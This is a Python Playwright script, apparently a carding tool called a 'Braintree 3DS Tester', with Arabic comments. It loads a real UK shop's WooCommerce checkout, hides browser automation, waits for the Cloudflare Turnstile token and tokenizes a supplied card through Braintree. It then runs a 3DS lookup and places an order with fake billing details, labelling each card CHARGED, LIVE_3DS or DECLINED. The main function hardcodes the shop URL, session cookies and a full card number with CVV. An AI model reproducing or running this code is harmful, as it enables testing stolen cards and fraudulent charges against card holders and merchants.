#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
VINEX Braintree 3DS Tester — Playwright Edition
- يفتح المتصفح تلقائياً
- يستخدم الكوكيز + auth_fp (اختياري)
- يعمل tokenize + lookup + checkout
- يرجّع: CHARGED / LIVE_3DS / DECLINED
"""
import asyncio, json, re, time, random, uuid, base64
from urllib.parse import urlparse
from playwright.async_api import async_playwright


class BraintreeTester:
    def __init__(self, checkout_url, cookies='', headless=False):
        self.checkout_url = checkout_url
        p = urlparse(checkout_url)
        self.host = p.netloc
        self.base = f'{p.scheme}://{p.netloc}'
        self.cookies_str = cookies
        self.headless = headless

        # extracted from page
        self.auth_fp = None
        self.merchant_id = None
        self.woo_nonce = None
        self.bt_config = None
        self.order_total = None
        self.currency = 'GBP'
        self.turnstile_token = None
        self.diagnostics = []

    def _log(self, msg):
        line = f'{time.time():.2f} {msg}'
        self.diagnostics.append(line)
        print(line)

    # ═══════════════════════════════════════════════════════════
    #  parse cookies string → list of dicts
    # ═══════════════════════════════════════════════════════════
    def _parse_cookies(self):
        out = []
        if not self.cookies_str: return out
        for part in self.cookies_str.split(';'):
            part = part.strip()
            if not part or '=' not in part: continue
            name, _, value = part.partition('=')
            out.append({
                'name': name.strip(),
                'value': value.strip(),
                'domain': self.host,
                'path': '/',
            })
        return out

    # ═══════════════════════════════════════════════════════════
    #  STEP 1: open checkout, extract all
    # ═══════════════════════════════════════════════════════════
    async def _open(self):
        self._pw = await async_playwright().start()
        self.browser = await self._pw.chromium.launch(
            headless=self.headless,
            args=['--disable-blink-features=AutomationControlled', '--no-sandbox'],
        )
        self.context = await self.browser.new_context(
            viewport={'width': 540, 'height': 1170},
            user_agent='Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            locale='en-GB',
            timezone_id='Europe/London',
        )

        # stealth
        await self.context.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
            window.chrome = { runtime: {} };
            Object.defineProperty(navigator, 'languages', {get: () => ['en-GB','en']});
            Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
        """)

        # cookies
        cookies = self._parse_cookies()
        if cookies:
            try:
                await self.context.add_cookies(cookies)
                self._log(f'✅ loaded {len(cookies)} cookies')
            except Exception as e:
                self._log(f'cookie load err: {e}')

        self.page = await self.context.new_page()

        # capture braintree config if sent
        self.page.on('response', self._on_response)

        # open checkout
        self._log(f'📄 opening {self.checkout_url}')
        await self.page.goto(self.checkout_url, wait_until='networkidle', timeout=60000)
        await self.page.wait_for_timeout(4000)

        # scroll to trigger payment load
        await self.page.evaluate('window.scrollBy(0, 800)')
        await self.page.wait_for_timeout(2000)

        # extract
        await self._extract()

    async def _on_response(self, response):
        try:
            if 'graphql' in response.url or 'braintree' in response.url:
                pass  # مش محتاجين نلتقط
        except: pass

    async def _extract(self):
        """استخرج auth_fp + nonce + total من المتصفح"""
        # 1. client_token من JS
        data = await self.page.evaluate('''
            () => {
                if (typeof wc_braintree_client_token !== 'undefined' &&
                    wc_braintree_client_token && wc_braintree_client_token[0]) {
                    return wc_braintree_client_token[0];
                }
                // fallback: من hidden input
                const el = document.querySelector('input[name="braintree_cc_config_data"]');
                if (el && el.value) return '__CONFIG__:' + el.value;
                return null;
            }
        ''')

        if data:
            try:
                if data.startswith('__CONFIG__:'):
                    cfg = json.loads(data.replace('__CONFIG__:', ''))
                    self.bt_config = cfg
                    self.auth_fp = cfg.get('authorizationFingerprint')
                    self.merchant_id = cfg.get('merchantId')
                else:
                    # base64 client_token
                    decoded = base64.b64decode(data + '=' * (-len(data) % 4)).decode('utf-8', errors='ignore')
                    cfg = json.loads(decoded)
                    self.bt_config = cfg
                    self.auth_fp = cfg.get('authorizationFingerprint')
                    self.merchant_id = cfg.get('merchantId')
                self._log(f'✅ merchant={self.merchant_id}')
                self._log(f'   auth_fp: {(self.auth_fp or "")[:60]}...')
            except Exception as e:
                self._log(f'decode err: {e}')

        # 2. woo nonce
        self.woo_nonce = await self.page.evaluate('''
            () => {
                const el = document.querySelector('input[name="woocommerce-process-checkout-nonce"]');
                return el ? el.value : null;
            }
        ''')
        self._log(f'✅ woo_nonce: {self.woo_nonce}')

        # 3. order total
        total = await self.page.evaluate('''
            () => {
                const el = document.querySelector('.order-total .amount bdi');
                if (el) return el.textContent.trim();
                return null;
            }
        ''')
        if total:
            self.order_total = re.sub(r'[^\d.]', '', total)
            self._log(f'✅ order_total: {self.order_total}')

        # 4. Turnstile token
        await self._wait_turnstile()

    async def _wait_turnstile(self, timeout=30):
        """انتظر Turnstile يحل نفسه"""
        self._log('⏳ waiting for Turnstile...')
        for i in range(timeout):
            token = await self.page.evaluate('''
                () => {
                    const el = document.querySelector('input[name="cf-turnstile-response"]');
                    return el ? el.value : null;
                }
            ''')
            if token and len(token) > 20:
                self.turnstile_token = token
                self._log(f'✅ turnstile: {token[:30]}...')
                return True
            await asyncio.sleep(1)
        self._log('⚠️  turnstile not solved')
        return False

    # ═══════════════════════════════════════════════════════════
    #  STEP 2: full charge flow inside browser
    # ═══════════════════════════════════════════════════════════
    async def Charge(self, card):
        parts = card.strip().split('|')
        if len(parts) < 4: return 'INVALID_FORMAT'
        number = parts[0].replace(' ', '')
        mm = parts[1].zfill(2)
        yy = parts[2]
        if len(yy) == 4: yy = yy[2:]
        cvc = parts[3]

        try:
            await self._open()

            if not self.auth_fp:
                return 'NO_AUTH_FP'
            if not self.turnstile_token:
                self._log('⚠️  continuing without turnstile token')

            # charge from inside the browser
            result = await self._charge_in_browser(number, mm, yy, cvc)
            return result

        except Exception as e:
            self._log(f'❌ charge err: {e}')
            return f'FATAL: {str(e)[:200]}'
        finally:
            try: await self.browser.close()
            except: pass
            try: await self._pw.stop()
            except: pass

    async def _charge_in_browser(self, number, mm, yy, cvc):
        """tokenize + lookup + checkout — كله من داخل المتصفح"""

        # 1. tokenize
        self._log('🔐 tokenizing...')
        tokenize_js = f'''
            async () => {{
                const query = `mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {{
                    tokenizeCreditCard(input: $input) {{
                        token creditCard {{ bin brandCode last4 }}
                    }}
                }}`;
                const payload = {{
                    clientSdkMetadata: {{
                        source: 'client', integration: 'custom',
                        sessionId: crypto.randomUUID(),
                    }},
                    query: query,
                    variables: {{
                        input: {{
                            creditCard: {{
                                number: '{number}',
                                expirationMonth: '{mm}',
                                expirationYear: '{yy}',
                                cvv: '{cvc}',
                                billingAddress: {{
                                    postalCode: 'OX14 4PG',
                                    streetAddress: 'W356'
                                }}
                            }},
                            options: {{ validate: false }}
                        }}
                    }},
                    operationName: 'TokenizeCreditCard'
                }};
                try {{
                    const r = await fetch('https://payments.braintree-api.com/graphql', {{
                        method: 'POST',
                        headers: {{
                            'Authorization': 'Bearer {self.auth_fp}',
                            'braintree-version': '2018-05-10',
                            'content-type': 'application/json',
                        }},
                        body: JSON.stringify(payload),
                    }});
                    return await r.json();
                }} catch(e) {{
                    return {{ error: String(e) }};
                }}
            }}
        '''
        tok = await self.page.evaluate(tokenize_js)
        if 'errors' in tok:
            return f'TOKENIZE_ERROR: {json.dumps(tok["errors"])[:200]}'

        nonce = tok.get('data', {}).get('tokenizeCreditCard', {}).get('token')
        if not nonce:
            return f'NO_NONCE: {json.dumps(tok)[:200]}'
        self._log(f'✅ nonce: {nonce[:40]}...')

        # 2. 3DS lookup
        self._log('🔍 3DS lookup...')
        bin_num = number[:6]
        amount = self.order_total or '1.00'

        lookup_js = f'''
            async () => {{
                const payload = {{
                    amount: '{amount}',
                    browserColorDepth: 24,
                    browserJavaEnabled: false,
                    browserJavascriptEnabled: true,
                    browserLanguage: 'en-GB',
                    browserScreenHeight: 1170,
                    browserScreenWidth: 540,
                    browserTimeZone: -60,
                    deviceChannel: 'Browser',
                    additionalInfo: {{
                        billingLine1: 'W356', billingCity: 'London',
                        billingState: '', billingPostalCode: 'OX14 4PG',
                        billingCountryCode: 'GB', billingPhoneNumber: '447700900123',
                        billingGivenName: 'Test', billingSurname: 'User',
                        email: 'test{random.randint(100,999)}@gmail.com',
                    }},
                    bin: '{bin_num}',
                    dfReferenceId: '0_' + crypto.randomUUID(),
                    clientMetadata: {{
                        requestedThreeDSecureVersion: '2',
                        sdkVersion: 'web/3.144.0',
                        cardinalDeviceDataCollectionTimeElapsed: 12,
                        issuerDeviceDataCollectionTimeElapsed: 3610,
                        issuerDeviceDataCollectionResult: true,
                    }},
                    authorizationFingerprint: '{self.auth_fp}',
                    braintreeLibraryVersion: 'braintree/web/3.144.0',
                    _meta: {{
                        merchantAppId: '{self.host}',
                        platform: 'web', sdkVersion: '3.144.0',
                        source: 'client', integration: 'custom',
                        integrationType: 'custom',
                        sessionId: crypto.randomUUID(),
                    }},
                }};
                try {{
                    const r = await fetch('https://api.braintreegateway.com/merchants/{self.merchant_id}/client_api/v1/payment_methods/{nonce}/three_d_secure/lookup', {{
                        method: 'POST',
                        headers: {{ 'content-type': 'application/json' }},
                        body: JSON.stringify(payload),
                    }});
                    return await r.json();
                }} catch(e) {{
                    return {{ error: String(e) }};
                }}
            }}
        '''
        lk = await self.page.evaluate(lookup_js)
        if 'errors' in lk:
            return f'LOOKUP_ERROR: {json.dumps(lk["errors"])[:200]}'

        info = lk.get('threeDSecureInfo', {}) or lk.get('lookup', {}) or lk
        challenge = bool(info.get('challengeRequired'))
        enrolled = info.get('enrolled')
        version = info.get('threeDSecureVersion', '?')
        self._log(f'📋 enrolled={enrolled} challenge={challenge} v={version}')

        # 3. checkout — نملأ الفورم من داخل المتصفح
        self._log('📤 placing order...')
        cfg_json = json.dumps(self.bt_config, separators=(',', ':')) if self.bt_config else '{}'

        checkout_js = f'''
            async () => {{
                const data = new URLSearchParams();
                data.append('billing_first_name', 'Test');
                data.append('billing_last_name', 'User');
                data.append('billing_company', '');
                data.append('billing_country', 'GB');
                data.append('billing_address_1', 'W356');
                data.append('billing_address_2', 'W456');
                data.append('billing_city', 'London');
                data.append('billing_state', 'W266');
                data.append('billing_postcode', 'OX14 4PG');
                data.append('billing_phone', '447700900123');
                data.append('billing_email', 'test{random.randint(100,999)}@gmail.com');
                data.append('shipping_country', 'GB');
                data.append('shipping_method[0]', 'flexible_shipping_11_5');
                data.append('payment_method', 'braintree_cc');
                data.append('braintree_cc_nonce_key', '{nonce}');
                data.append('braintree_cc_device_data', JSON.stringify({{correlation_id: '{str(uuid.uuid4())[:32]}'}}));
                data.append('braintree_cc_3ds_nonce_key', '');
                data.append('braintree_cc_config_data', {json.dumps(cfg_json)});
                data.append('terms', 'on');
                data.append('terms-field', '1');
                data.append('gdpr_woo_consent', '1');
                data.append('woocommerce-process-checkout-nonce', '{self.woo_nonce}');
                data.append('_wp_http_referer', '/?wc-ajax=update_order_review');

                // Turnstile token
                const tst = document.querySelector('input[name="cf-turnstile-response"]');
                if (tst && tst.value) data.append('cf-turnstile-response', tst.value);

                try {{
                    const r = await fetch('/?wc-ajax=checkout', {{
                        method: 'POST',
                        headers: {{ 'content-type': 'application/x-www-form-urlencoded' }},
                        body: data.toString(),
                    }});
                    const text = await r.text();
                    return {{ status: r.status, text: text }};
                }} catch(e) {{
                    return {{ error: String(e) }};
                }}
            }}
        '''
        co = await self.page.evaluate(checkout_js)
        if co.get('error'):
            return f'CHECKOUT_ERROR: {co["error"]}'

        text = co.get('text', '')
        self._log(f'📥 checkout response len={len(text)}')

        try:
            j = json.loads(text)
            result = j.get('result')
            messages = j.get('messages', '')
            clean = re.sub(r'<[^>]+>', '', str(messages))
            clean = re.sub(r'\s+', ' ', clean).strip()

            if result == 'success':
                return f'CHARGED {self.order_total} {self.currency}'

            if result == 'failure':
                low = clean.lower()
                if '3d secure' in low or '3ds' in low:
                    return f'LIVE_3DS (enrolled={enrolled}, v={version}) — Valid card, OTP required'
                if 'verify that you are human' in low:
                    return f'TURNSTILE_FAILED (enrolled={enrolled}) — Card Valid, Turnstile blocked'
                if 'declined' in low: return f'DECLINED: {clean[:180]}'
                if 'insufficient' in low: return f'INSUFFICIENT_FUNDS'
                if 'cvv' in low: return f'CVV_FAIL'
                if 'expired' in low: return f'EXPIRED'
                if 'do not honor' in low: return f'DO_NOT_HONOR'
                return f'DECLINED: {clean[:180]}'
        except Exception:
            pass

        if 'order-received' in text:
            return f'CHARGED {self.order_total} {self.currency}'
        return f'UNKNOWN: {text[:200]}'


# ═══════════════════════════════════════════════════════════════
#  Main
# ═══════════════════════════════════════════════════════════════
async def main():
    COOKIES = (
        'woocommerce_items_in_cart=1; '
        'wp_woocommerce_session_b89dcd3ac6387311302297d2b2714701=t_4ab0dac325c86a42c210bff77f3a84%7C1794653648%7C1794567248%7Cd995540a42879fe0205c2c3ac47b3f1e; '
        'woocommerce_cart_hash=a7e7aa962b94ba5769367c704cffdffa'
    )

    t = BraintreeTester(
        checkout_url='https://shop.herbs-hands-healing.co.uk/checkout',
        cookies=COOKIES,
        headless=False,  # ← مهم! خليه False عشان تشوف المتصفح
    )

    print('=' * 60)
    result = await t.Charge('5523427233579293|12|2027|953')
    print('=' * 60)
    print(f'RESULT: {result}')
    print('=' * 60)

if __name__ == '__main__':
    asyncio.run(main())
